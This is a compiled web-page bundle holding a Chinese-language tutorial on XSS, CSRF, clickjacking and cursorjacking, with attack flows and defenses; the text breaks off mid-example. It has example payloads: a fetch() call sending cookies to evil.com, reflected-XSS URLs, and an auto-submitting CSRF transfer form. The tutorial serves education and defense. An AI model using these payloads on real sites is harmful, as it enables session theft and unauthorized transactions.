import{_ as a,V as s,W as n,a0 as t}from"./framework-9a29aaa0.js";const e={},o=t(`<ul><li><a href="#xss-and-ui-attack">XSS and UI attack</a><ul><li><a href="#xss-attack%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB">XSS attack（跨站脚本攻击）？</a><ul><li><a href="#1-%E5%AD%98%E5%82%A8%E5%9E%8B-xssstored-xss"><strong>1. 存储型 XSS（Stored XSS）</strong></a><ul><li><a href="#%E5%AE%9A%E4%B9%89"><strong>定义</strong>：</a></li><li><a href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B"><strong>攻击流程</strong>：</a></li><li><a href="#%E4%BE%8B%E5%AD%90"><strong>例子</strong>：</a></li><li><a href="#%E6%BC%8F%E6%B4%9E%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81"><strong>漏洞示例代码</strong>：</a></li></ul></li><li><a href="#2-%E5%8F%8D%E5%B0%84%E5%9E%8B-xssreflected-xss"><strong>2. 反射型 XSS（Reflected XSS）</strong></a><ul><li><a href="#%E5%AE%9A%E4%B9%89-1"><strong>定义</strong>：</a></li><li><a href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B-1"><strong>攻击流程</strong>：</a></li><li><a href="#%E4%BE%8B%E5%AD%90-1"><strong>例子</strong>：</a></li><li><a href="#%E6%BC%8F%E6%B4%9E%E7%A4%BA%E4%BE%8B%E4%BB%A3%E7%A0%81-1"><strong>漏洞示例代码</strong>：</a></li></ul></li><li><a href="#3%E5%AD%98%E5%82%A8%E5%9E%8B-xss-%E5%92%8C-%E5%8F%8D%E5%B0%84%E5%9E%8B-xss-%E7%9A%84%E5%8C%BA%E5%88%AB"><strong>3.存储型 XSS 和 反射型 XSS 的区别</strong></a></li><li><a href="#4%E5%8F%8D%E5%B0%84%E5%9E%8B-xssreflected-xss-%E5%92%8C-csrfcross-site-request-forgery%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%E7%9A%84%E5%8C%BA%E5%88%AB"><strong>4.反射型 XSS（Reflected XSS）</strong> 和 **CSRF（Cross-Site Request Forgery，跨站请求伪造）**的区别</a><ul><li><a href="#%E5%8F%8D%E5%B0%84%E5%9E%8B-xssreflected-xss"><strong>反射型 XSS（Reflected XSS）</strong></a><ul><li><a href="#%E5%AE%9A%E4%B9%89-2"><strong>定义：</strong></a></li><li><a href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B-2"><strong>攻击流程：</strong></a></li><li><a href="#%E5%85%B8%E5%9E%8B%E5%9C%BA%E6%99%AF"><strong>典型场景：</strong></a></li><li><a href="#%E7%A4%BA%E4%BE%8B"><strong>示例：</strong></a></li><li><a href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95"><strong>防御方法：</strong></a></li></ul></li><li><a href="#csrfcross-site-request-forgery%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0"><strong>CSRF（Cross-Site Request Forgery，跨站请求伪造）</strong></a><ul><li><a href="#%E5%AE%9A%E4%B9%89-3"><strong>定义：</strong></a></li><li><a href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B-3"><strong>攻击流程：</strong></a></li><li><a href="#%E5%85%B8%E5%9E%8B%E5%9C%BA%E6%99%AF-1"><strong>典型场景：</strong></a></li><li><a href="#%E7%A4%BA%E4%BE%8B-1"><strong>示例：</strong></a></li><li><a href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95-1"><strong>防御方法：</strong></a></li></ul></li><li><a href="#%E5%8F%8D%E5%B0%84%E6%80%A7-xss-%E5%92%8C-csrf-%E7%9A%84%E5%8C%BA%E5%88%AB"><strong>反射性 XSS 和 CSRF 的区别</strong></a></li></ul></li><li><a href="#5%E5%A6%82%E4%BD%95%E9%98%B2%E6%AD%A2-xss-%E6%94%BB%E5%87%BB"><strong>5.如何防止 XSS 攻击？</strong></a></li></ul></li><li><a href="#ui-attack">UI attack</a><ul><li><a href="#clickjacking%E7%82%B9%E5%87%BB%E5%8A%AB%E6%8C%81"><strong>Clickjacking（点击劫持）</strong></a><ul><li><a href="#%E5%AE%9A%E4%B9%89-4"><strong>定义</strong>：</a></li><li><a href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B-4"><strong>攻击流程</strong>：</a></li><li><a href="#%E6%94%BB%E5%87%BB%E7%A4%BA%E4%BE%8B"><strong>攻击示例</strong>：</a></li><li><a href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95-2"><strong>防御方法</strong>：</a></li></ul></li><li><a href="#cursorjacking%E5%85%89%E6%A0%87%E5%8A%AB%E6%8C%81"><strong>Cursorjacking（光标劫持）</strong></a><ul><li><a href="#%E5%AE%9A%E4%B9%89-5"><strong>定义</strong>：</a></li><li><a href="#%E6%94%BB%E5%87%BB%E6%B5%81%E7%A8%8B-5"><strong>攻击流程</strong>：</a></li><li><a href="#%E6%94%BB%E5%87%BB%E7%A4%BA%E4%BE%8B-1"><strong>攻击示例</strong>：</a></li><li><a href="#%E9%98%B2%E5%BE%A1%E6%96%B9%E6%B3%95-3"><strong>防御方法</strong>：</a></li></ul></li><li><a href="#clickjacking-%E5%92%8C-cursorjacking-%E7%9A%84%E5%8C%BA%E5%88%AB"><strong>Clickjacking 和 Cursorjacking 的区别</strong></a></li><li><a href="#%E6%80%BB%E7%BB%93"><strong>总结</strong>：</a></li></ul></li></ul></li></ul><h1 id="xss-and-ui-attack" tabindex="-1"><a class="header-anchor" href="#xss-and-ui-attack" aria-hidden="true">#</a> XSS and UI attack</h1><h2 id="xss-attack-跨站脚本攻击" tabindex="-1"><a class="header-anchor" href="#xss-attack-跨站脚本攻击" aria-hidden="true">#</a> XSS attack（跨站脚本攻击）？</h2><p><strong>XSS（Cross-Site Scripting）</strong> 是一种常见的网络安全漏洞，攻击者通过在网页中注入恶意的 JavaScript 代码，使得受害者在浏览网页时不知不觉地执行恶意脚本，从而达到窃取用户信息、篡改网页内容、实施钓鱼攻击等目的。</p><p>XSS 漏洞通常发生在 Web 应用程序没有对用户输入进行有效的验证和过滤时，攻击者可以通过网页的输入框、URL 参数或其他用户交互的方式将恶意脚本注入到页面中。</p><p>XSS 分为 <strong>存储型 XSS（Stored XSS）</strong> 和 <strong>反射型 XSS（Reflected XSS）</strong> 两种常见类型，它们的区别在于攻击脚本的存储和传播方式不同。</p><hr><h3 id="_1-存储型-xss-stored-xss" tabindex="-1"><a class="header-anchor" href="#_1-存储型-xss-stored-xss" aria-hidden="true">#</a> <strong>1. 存储型 XSS（Stored XSS）</strong></h3><h4 id="定义" tabindex="-1"><a class="header-anchor" href="#定义" aria-hidden="true">#</a> <strong>定义</strong>：</h4><p>存储型 XSS 是指恶意脚本被存储在服务器端（如数据库、日志文件等）并随着网页内容的加载返回给用户。当用户访问该网页时，存储在服务器上的恶意脚本会在浏览器中执行。</p><h4 id="攻击流程" tabindex="-1"><a class="header-anchor" href="#攻击流程" aria-hidden="true">#</a> <strong>攻击流程</strong>：</h4><ol><li>攻击者将恶意的 JavaScript 代码提交到 Web 应用的输入表单中（如评论、留言板等）。</li><li>服务器没有进行有效的输入验证和过滤，直接将这段恶意代码存储在数据库或日志中。</li><li>当其他用户访问包含该恶意代码的页面时，浏览器自动执行这段恶意脚本。</li></ol><h4 id="例子" tabindex="-1"><a class="header-anchor" href="#例子" aria-hidden="true">#</a> <strong>例子</strong>：</h4><p>假设某个论坛网站的评论系统存在存储型 XSS 漏洞，攻击者可以在评论框中输入以下代码：</p><div class="language-html line-numbers-mode" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">&#39;你的账户已被黑客入侵！&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>这段代码会被存储在服务器的数据库中。当其他用户查看这个帖子时，浏览器会自动执行这段脚本，弹出提示框。虽然这只是一个简单的例子，攻击者也可以通过类似的方式窃取用户的 cookie 或重定向到钓鱼网站。</p><h4 id="漏洞示例代码" tabindex="-1"><a class="header-anchor" href="#漏洞示例代码" aria-hidden="true">#</a> <strong>漏洞示例代码</strong>：</h4><ul><li>攻击者提交的评论：</li></ul><div class="language-html line-numbers-mode" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
  <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">&#39;http://evil.com/steal?cookie=&#39;</span> <span class="token operator">+</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>服务器存储并返回的评论内容（未过滤）：</li></ul><div class="language-html line-numbers-mode" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>User: John<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>Comment: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"><span class="token function">fetch</span><span class="token punctuation">(</span><span class="token string">&#39;http://evil.com/steal?cookie=&#39;</span> <span class="token operator">+</span> document<span class="token punctuation">.</span>cookie<span class="token punctuation">)</span><span class="token punctuation">;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>其他用户查看评论时，浏览器会执行该脚本，将目标用户的 cookies 发送到攻击者指定的恶意服务器。</li></ul><hr><h3 id="_2-反射型-xss-reflected-xss" tabindex="-1"><a class="header-anchor" href="#_2-反射型-xss-reflected-xss" aria-hidden="true">#</a> <strong>2. 反射型 XSS（Reflected XSS）</strong></h3><h4 id="定义-1" tabindex="-1"><a class="header-anchor" href="#定义-1" aria-hidden="true">#</a> <strong>定义</strong>：</h4><p>反射型 XSS 是指恶意脚本通过用户的请求被即时反射到网页中，攻击脚本并未存储在服务器上。通常这种攻击方式通过在 URL、查询参数或表单中嵌入恶意代码，受害者点击恶意链接后，浏览器执行其中的恶意脚本。</p><h4 id="攻击流程-1" tabindex="-1"><a class="header-anchor" href="#攻击流程-1" aria-hidden="true">#</a> <strong>攻击流程</strong>：</h4><ol><li>攻击者构造一个包含恶意脚本的 URL（例如，利用 URL 参数传递恶意代码）。</li><li>当受害者点击该 URL 或访问包含恶意参数的网页时，Web 应用会将恶意代码反射到页面中，并在浏览器中执行。</li></ol><h4 id="例子-1" tabindex="-1"><a class="header-anchor" href="#例子-1" aria-hidden="true">#</a> <strong>例子</strong>：</h4><p>假设一个网站存在反射型 XSS 漏洞，攻击者可以构造如下链接：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://example.com/search?q=&lt;script&gt;alert(&#39;XSS Attack!&#39;);&lt;/script&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>当受害者点击该链接时，网页会返回带有 <code>q</code> 参数的内容，并在页面中显示这个参数内容。如果没有对输入进行有效的过滤，浏览器会将其中的 <code>&lt;script&gt;</code> 标签当作 JavaScript 代码执行，弹出提示框。</p><h4 id="漏洞示例代码-1" tabindex="-1"><a class="header-anchor" href="#漏洞示例代码-1" aria-hidden="true">#</a> <strong>漏洞示例代码</strong>：</h4><ul><li>服务器返回的页面：</li></ul><div class="language-html line-numbers-mode" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span><span class="token punctuation">&gt;</span></span>Search Results<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">&gt;</span></span>You searched for: <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript"> <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">&#39;XSS Attack!&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span> </span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><ul><li>该脚本在受害者的浏览器中立即执行，导致浏览器弹出警告框或进行更复杂的攻击。</li></ul><hr><h3 id="_3-存储型-xss-和-反射型-xss-的区别" tabindex="-1"><a class="header-anchor" href="#_3-存储型-xss-和-反射型-xss-的区别" aria-hidden="true">#</a> <strong>3.存储型 XSS 和 反射型 XSS 的区别</strong></h3><table><thead><tr><th><strong>类型</strong></th><th><strong>存储方式</strong></th><th><strong>触发方式</strong></th><th><strong>常见场景</strong></th></tr></thead><tbody><tr><td><strong>存储型 XSS</strong></td><td>恶意脚本存储在服务器端（数据库、日志等）</td><td>当用户访问包含恶意代码的页面时触发</td><td>评论、论坛、消息、聊天系统</td></tr><tr><td><strong>反射型 XSS</strong></td><td>恶意脚本存储在 URL 或请求参数中</td><td>用户点击恶意链接或访问特定 URL 时触发</td><td>搜索框、URL 参数、电子邮件链接</td></tr></tbody></table><h3 id="_4-反射型-xss-reflected-xss-和-csrf-cross-site-request-forgery-跨站请求伪造-的区别" tabindex="-1"><a class="header-anchor" href="#_4-反射型-xss-reflected-xss-和-csrf-cross-site-request-forgery-跨站请求伪造-的区别" aria-hidden="true">#</a> <strong>4.反射型 XSS（Reflected XSS）</strong> 和 **CSRF（Cross-Site Request Forgery，跨站请求伪造）**的区别</h3><h4 id="反射型-xss-reflected-xss" tabindex="-1"><a class="header-anchor" href="#反射型-xss-reflected-xss" aria-hidden="true">#</a> <strong>反射型 XSS（Reflected XSS）</strong></h4><h5 id="定义-2" tabindex="-1"><a class="header-anchor" href="#定义-2" aria-hidden="true">#</a> <strong>定义：</strong></h5><p>反射性 XSS 是指攻击者通过构造恶意的 URL，将恶意脚本注入到 URL 参数或请求中，并借助服务器的响应将这些恶意代码反射回页面。当受害者点击包含恶意脚本的链接时，浏览器会执行这段恶意脚本。</p><h5 id="攻击流程-2" tabindex="-1"><a class="header-anchor" href="#攻击流程-2" aria-hidden="true">#</a> <strong>攻击流程：</strong></h5><ol><li>攻击者构造一个包含恶意代码的 URL 或请求，例如通过 URL 参数传递 JavaScript 代码。</li><li>当受害者点击该链接时，Web 应用会将该恶意代码反射到网页中，浏览器解析并执行这段脚本。</li><li>攻击者可以通过该脚本窃取用户的 Cookie、会话信息，或者进行其他恶意操作。</li></ol><h5 id="典型场景" tabindex="-1"><a class="header-anchor" href="#典型场景" aria-hidden="true">#</a> <strong>典型场景：</strong></h5><ul><li>用户输入没有经过验证的查询参数，页面将其直接输出（如搜索框、URL 参数等）。</li><li>攻击者通过社会工程学诱使用户点击包含恶意脚本的 URL。</li></ul><h5 id="示例" tabindex="-1"><a class="header-anchor" href="#示例" aria-hidden="true">#</a> <strong>示例：</strong></h5><p>攻击者构造以下 URL：</p><div class="language-plaintext line-numbers-mode" data-ext="plaintext"><pre class="language-plaintext"><code>http://example.com/search?q=&lt;script&gt;alert(&#39;XSS&#39;)&lt;/script&gt;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>当受害者点击该链接时，<code>q</code> 参数中的恶意脚本被反射到页面，执行 <code>alert(&#39;XSS&#39;)</code>，弹出一个警告框。</p><h5 id="防御方法" tabindex="-1"><a class="header-anchor" href="#防御方法" aria-hidden="true">#</a> <strong>防御方法：</strong></h5><ul><li>对用户输入进行严格验证和输出编码，确保 HTML 标签和 JavaScript 不会被执行。</li><li>使用内容安全策略（CSP）来限制可执行的脚本来源。</li><li>设置正确的 HTTP 响应头（如 <code>X-XSS-Protection</code>）以启用浏览器的 XSS 过滤器。</li></ul><h4 id="csrf-cross-site-request-forgery-跨站请求伪造" tabindex="-1"><a class="header-anchor" href="#csrf-cross-site-request-forgery-跨站请求伪造" aria-hidden="true">#</a> <strong>CSRF（Cross-Site Request Forgery，跨站请求伪造）</strong></h4><h5 id="定义-3" tabindex="-1"><a class="header-anchor" href="#定义-3" aria-hidden="true">#</a> <strong>定义：</strong></h5><p>CSRF 是一种通过伪造用户请求来执行不受用户同意的操作的攻击方式。攻击者利用用户的身份和授权（通常是通过用户的 Cookie 或认证信息）发送恶意请求，从而执行某些操作，用户对此毫不知情。</p><h5 id="攻击流程-3" tabindex="-1"><a class="header-anchor" href="#攻击流程-3" aria-hidden="true">#</a> <strong>攻击流程：</strong></h5><ol><li>攻击者诱使已登录的用户访问某个恶意网站或链接（通常是通过社交工程、钓鱼邮件等手段）。</li><li>恶意网站会自动生成一个请求，伪装成合法的请求，并利用用户浏览器中有效的 Cookie 或身份信息发送给目标网站。</li><li>如果目标网站没有进行有效的身份验证保护（如 CSRF Token），那么这个伪造的请求会被服务器当作合法请求处理，执行相应的操作（如转账、修改密码等）。</li></ol><h5 id="典型场景-1" tabindex="-1"><a class="header-anchor" href="#典型场景-1" aria-hidden="true">#</a> <strong>典型场景：</strong></h5><ul><li>用户在网站 A 登录后，攻击者诱使其访问网站 B，而网站 B 会向网站 A 发起恶意请求，利用 A 网站的认证信息（例如 Cookie）执行某些操作。</li></ul><h5 id="示例-1" tabindex="-1"><a class="header-anchor" href="#示例-1" aria-hidden="true">#</a> <strong>示例：</strong></h5><p>假设网站 A 允许用户转账，且用户已经登录，具有合法的 Cookie。攻击者通过发送以下 HTML 表单来伪造转账请求：</p><div class="language-html line-numbers-mode" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>https://www.example.com/transfer<span class="token punctuation">&quot;</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>POST<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>amount<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>1000<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>hidden<span class="token punctuation">&quot;</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>recipient<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>attacker_account<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>submit<span class="token punctuation">&quot;</span></span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>Transfer<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">&gt;</span></span><span class="token script"><span class="token language-javascript">
    document<span class="token punctuation">.</span>forms<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 自动提交表单</span>
</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>当用户点击某个恶意链接或访问恶意网页时，这段表单会自动提交，导致用户账户的资金被转账到攻击者的账户。</p><h5 id="防御方法-1" tabindex="-1"><a class="header-anchor" href="#防御方法-1" aria-hidden="true">#</a> <strong>防御方法：</strong></h5><ul><li>使用 <strong>CSRF Token</strong>（跨站请求伪造令牌）：每次提交表单时，都要求生成一个唯一的 CSRF Token，并且在后台验证该 Token，防止伪造请求。</li><li>检查 Referer 头：可以验证请求是否来自合法的来源。</li><li>使用 <strong>SameSite Cookie 属性</strong>：防止跨站点请求中发送 Cookie。</li></ul><hr><h4 id="反射性-xss-和-csrf-的区别" tabindex="-1"><a class="header-anchor" href="#反射性-xss-和-csrf-的区别" aria-hidden="true">#</a> <strong>反射性 XSS 和 CSRF 的区别</strong></h4><table><thead><tr><th><strong>特征</strong></th><th><strong>反射性 XSS</strong></th><th><strong>CSRF</strong></th></tr></thead><tbody><tr><td><strong>攻击目标</strong></td><td>通过执行恶意 JavaScript 代码，窃取用户信息、会话等。</td><td>利用用户已登录的状态发起未经授权的操作。</td></tr><tr><td><strong>攻击方式</strong></td><td>利用恶意链接，注入 JavaScript 代码，并反射到用户的页面中。</td><td>利用用户的认证信息（如 Cookie），伪造请求发送到服务器。</td></tr><tr><td><strong>受害对象</strong></td><td>攻击对象是浏览器，攻击者的代码会在用户浏览器中执行。</td><td>攻击对象是服务器，伪造的请求会在服务器执行非法操作。</td></tr><tr><td><strong>需要的条件</strong></td><td>用户点击恶意链接或访问包含恶意代码的页面。</td><td>用户已经登录目标网站，且攻击者通过诱导用户访问恶意网站。</td></tr><tr><td><strong>防御方法</strong></td><td>输入验证、输出编码、CSP、X-XSS-Protection。</td><td>CSRF Token、验证 Referer 头、SameSite Cookie。</td></tr><tr><td><strong>攻击类型</strong></td><td>执行脚本代码、窃取信息、篡改网页内容等。</td><td>伪造请求、执行未经授权的操作（如资金转账、密码修改等）。</td></tr></tbody></table><h3 id="_5-如何防止-xss-攻击" tabindex="-1"><a class="header-anchor" href="#_5-如何防止-xss-攻击" aria-hidden="true">#</a> <strong>5.如何防止 XSS 攻击？</strong></h3><ol><li><p><strong>输入验证与输出编码</strong>：</p><ul><li>对所有用户输入进行严格的验证，尤其是对 HTML 和 JavaScript 代码进行编码。可以使用 HTML 编码（如 <code>&lt;</code> 编码为 <code>&amp;lt;</code>）来阻止浏览器解释恶意脚本。</li></ul></li><li><p><strong>使用 CSP（内容安全策略）</strong>：</p><ul><li>配置内容安全策略（CSP），限制哪些资源可以被加载，防止外部脚本的执行。</li></ul></li><li><p><strong>使用 HTTP-only 和 Secure 标志设置 Cookie</strong>：</p><ul><li>设置 Cookie 的 <code>HTTPOnly</code> 属性，使得 JavaScript 无法访问敏感的 Cookie。</li></ul></li><li><p><strong>正确配置 HTTP 头</strong>：</p><ul><li>使用 HTTP 响应头 <code>X-XSS-Protection: 1; mode=block</code>，开启浏览器的 XSS 过滤器。</li></ul></li><li><p><strong>避免直接执行用户输入</strong>：</p><ul><li>尽量避免在 JavaScript 中直接插入未经处理的用户输入，尤其是用于动态生成 HTML 元素时。</li><li>过滤或转义危险字符，如 &lt;, &gt;, &amp;, &quot;, &#39;, , / 等。示例：将 &lt; 替换为 &lt;，&gt; 替换为 &gt;。</li></ul></li></ol><p>XSS 攻击在 Web 开发中十分常见，开发者需要确保用户输入被正确验证和过滤，避免不安全的代码执行，保障用户的安全。</p><h2 id="ui-attack" tabindex="-1"><a class="header-anchor" href="#ui-attack" aria-hidden="true">#</a> UI attack</h2><h3 id="clickjacking-点击劫持" tabindex="-1"><a class="header-anchor" href="#clickjacking-点击劫持" aria-hidden="true">#</a> <strong>Clickjacking（点击劫持）</strong></h3><h4 id="定义-4" tabindex="-1"><a class="header-anchor" href="#定义-4" aria-hidden="true">#</a> <strong>定义</strong>：</h4><p>Clickjacking（点击劫持）是一种欺骗用户的攻击方式，攻击者将透明的页面层叠加到用户可以看到的网页元素之上，诱使用户点击实际不可见的按钮、链接或表单，而这些操作实际上是由攻击者控制的。这使得用户执行一些他们并未意识到的操作，例如提交表单、点击按钮或执行其他敏感操作。</p><h4 id="攻击流程-4" tabindex="-1"><a class="header-anchor" href="#攻击流程-4" aria-hidden="true">#</a> <strong>攻击流程</strong>：</h4><ol><li><strong>创建恶意页面</strong>：攻击者创建一个页面，将一个透明的 <code>&lt;iframe&gt;</code> 嵌入到该页面中，嵌入的页面包含一个隐藏的、可点击的内容（如按钮、链接或表单）。</li><li><strong>诱使用户点击</strong>：攻击者通过诱导用户点击该页面（比如通过钓鱼邮件、社交媒体链接等），用户以为自己点击的是正常的按钮或链接。</li><li><strong>执行恶意操作</strong>：实际上，用户的点击操作会触发 <code>&lt;iframe&gt;</code> 中的不可见元素，从而执行恶意操作，比如提交表单、修改设置、转账等。</li></ol><h4 id="攻击示例" tabindex="-1"><a class="header-anchor" href="#攻击示例" aria-hidden="true">#</a> <strong>攻击示例</strong>：</h4><p>假设一个用户正在登录银行网站，攻击者通过社交工程学（比如通过钓鱼邮件）诱使用户点击一个链接。攻击者页面看起来很正常，但实际情况是，页面中的一个透明 <code>&lt;iframe&gt;</code> 层叠到了银行网站的登录按钮上。这个 <code>&lt;iframe&gt;</code> 中可能包含一个恶意页面，伪装成用户可以点击的内容。</p><ul><li><p>用户看到的是：</p><div class="language-html line-numbers-mode" data-ext="html"><pre class="language-html"><code><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span><span class="token punctuation">&gt;</span></span>点击获取优惠<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div></li><li><p>实际上，这个按钮被 <code>&lt;iframe&gt;</code> 覆盖，用户点击的是 <code>&lt;iframe&gt;</code> 中的某个隐藏按钮，执行的是银行的资金转账操作。</p></li></ul><h4 id="防御方法-2" tabindex="-1"><a class="header-anchor" href="#防御方法-2" aria-hidden="true">#</a> <strong>防御方法</strong>：</h4><ol><li><strong>X-Frame-Options</strong>：通过设置 HTTP 响应头 <code>X-Frame-Options: DENY</code> 或 <code>SAMEORIGIN</code>，禁止网页被嵌入到 <code>&lt;iframe&gt;</code> 中。</li><li><strong>Content Security Policy (CSP)</strong>：通过 CSP 设置 <code>frame-ancestors</code> 指令来指定允许哪些域嵌套当前页面。</li><li><strong>JavaScript 防护</strong>：可以使用 JavaScript 检测当前页面是否被嵌套在 <code>&lt;iframe&gt;</code> 中，如果是，自动退出或警告用户。</li></ol><hr><h3 id="cursorjacking-光标劫持" tabindex="-1"><a class="header-anchor" href="#cursorjacking-光标劫持" aria-hidden="true">#</a> <strong>Cursorjacking（光标劫持）</strong></h3><h4 id="定义-5" tabindex="-1"><a class="header-anchor" href="#定义-5" aria-hidden="true">#</a> <strong>定义</strong>：</h4><p>Cursorjacking（光标劫持）是一种通过修改用户光标行为的攻击方式。攻击者可以利用 CSS 和 JavaScript 动态改变网页中光标的位置或外观，使得用户的点击看起来是在一个位置，实际上却是在另一个位置。此类攻击常通过欺骗用户点击不可见的、受控区域，从而操纵用户的点击行为，进而导致某些操作的执行。</p><h4 id="攻击流程-5" tabindex="-1"><a class="header-anchor" href="#攻击流程-5" aria-hidden="true">#</a> <strong>攻击流程</strong>：</h4><ol><li><strong>劫持光标</strong>：攻击者通过修改页面上的光标样式或者通过 JavaScript 动态改变光标位置，欺骗用户认为他们正在点击一个按钮或链接。</li><li><strong>欺骗用户行为</strong>：当用户点击页面时，实际上他们点击的是一个不可见的目标，而非他们认为的目标。攻击者可以将光标放置在页面上可见的区域，但实质上，点击事件会被发送到一个完全不同的地方。</li><li><strong>执行恶意操作</strong>：这种点击行为可以被用来触发一些不希望发生的操作，例如提交表单、触发恶意脚本等。</li></ol><h4 id="攻击示例-1" tabindex="-1"><a class="header-anchor" 